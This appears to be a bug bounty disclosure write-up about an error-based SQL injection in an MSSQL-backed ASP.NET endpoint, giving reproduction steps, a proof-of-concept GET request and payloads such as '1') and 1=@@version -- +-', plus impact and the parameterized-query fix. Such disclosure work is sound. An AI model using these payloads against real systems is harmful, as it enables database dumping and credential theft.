# Title: Logical MSSQL Error-Based SQL Injection on Private Program

- **Platform**: HackerOne
- **Program**: Private Bug Bounty Program
- **Severity**: Critical
- **Date**: 2024-02-15
- **Researcher**: Ahmed (aloneinjector1)
- **Bounty**: $5,400

## Summary
A logical MSSQL error-based SQL injection vulnerability was uncovered in a private program's endpoint at `/path/test.aspx`. The vulnerability allowed an attacker to dump all table columns and access sensitive data from the MSSQL database.

## Technical Details
The endpoint `test.aspx` accepted a `fuzz` parameter that was directly incorporated into SQL queries. Initial testing with a single quote triggered an "Incorrect syntax near '='" error, hinting at SQL injection. The researcher discovered that the query used a logical comparison that could be exploited to extract information error by error.

By appending values like `'")`, the researcher triggered errors revealing table name length constraints. The injection was in a WHERE clause that required careful balancing of parentheses and quotes. The payload `1') and 1=@@version -- +-` successfully executed, proving error-based injection capability.

## Steps to Reproduce
1. Access `https://target.com/path/test.aspx?fuzz=test`
2. Test with single quote: `fuzz=test'` → error
3. Find the balanced injection: `fuzz=1') and 1=1 -- +-` → works
4. Extract database version: `fuzz=1') and 1=@@version -- +-` → version disclosed in error
5. Begin systematic data extraction using error-based techniques

## Proof of Concept
Vulnerable request:
```
GET /path/test.aspx?fuzz=1') and 1=@@version -- +- HTTP/1.1
Host: target.com
```

The error message revealed the SQL Server version, confirming the injection point. From there, systematic extraction of table names, column names, and data was possible using error-based techniques like `CONVERT(int, @@version)` to force type conversion errors containing data.

## Impact
- Full database enumeration
- Extraction of all table columns and data
- Access to user credentials (hashed and potentially plaintext)
- Access to application configuration data
- Potential lateral movement to connected systems
- Complete database compromise

## Remediation
The program implemented parameterized queries (prepared statements) for the affected endpoint. All user input is now properly parameterized, preventing SQL injection. Input validation and stored procedure usage were also recommended.

## References
- https://medium.com/@aloneinjector1/logical-mssql-error-based-injection-vulnerability-on-private-program-0c988d1043ec
